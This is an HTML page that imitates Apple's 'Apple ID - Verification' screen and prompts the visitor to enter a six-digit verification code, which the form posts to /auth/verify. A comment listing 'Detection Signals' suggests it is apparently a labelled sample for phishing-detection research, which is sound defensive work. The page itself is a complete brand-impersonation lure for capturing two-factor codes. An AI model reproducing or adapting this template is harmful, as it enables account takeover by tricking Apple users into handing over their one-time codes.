<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID - Verification</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f5f7; margin: 0; padding: 20px; }
        .apple-container { max-width: 420px; margin: 60px auto; background: white; border-radius: 18px; box-shadow: 0 4px 16px rgba(0,0,0,0.08); padding: 48px 40px; }
        .apple-logo { text-align: center; margin-bottom: 32px; font-size: 48px; }
        .apple-title { color: #1d1d1f; font-size: 28px; margin-bottom: 12px; font-weight: 600; text-align: center; }
        .apple-text { color: #86868b; line-height: 1.6; margin-bottom: 28px; text-align: center; font-size: 17px; }
        .apple-form-group { margin-bottom: 20px; }
        .apple-input { width: 100%; padding: 14px; border: 1px solid #d2d2d7; border-radius: 12px; font-size: 17px; box-sizing: border-box; }
        .apple-input:focus { border-color: #0071e3; outline: none; box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.15); }
        .apple-button { width: 100%; padding: 15px; background: #0071e3; color: white; border: none; border-radius: 12px; font-size: 17px; font-weight: 500; cursor: pointer; }
        .apple-button:hover { background: #0077ed; }
    </style>
</head>
<body>
    <!-- Detection Signals: Tech domain: apple, apple id, icloud -->
    <div class="apple-container">
        <div class="apple-logo"></div>
        <h1 class="apple-title">Verification Code</h1>
        <p class="apple-text">Enter the verification code sent to your device.</p>
        <form id="verifyForm" action="/auth/verify" method="POST">
            <div class="apple-form-group">
                <input type="tel" id="verifyCode" name="verify_code" class="apple-input" placeholder="000000" maxlength="6" pattern="[0-9]{6}" inputmode="numeric" autocomplete="one-time-code" required />
            </div>
            <button type="submit" class="apple-button">Continue</button>
        </form>
    </div>
</body>
</html>
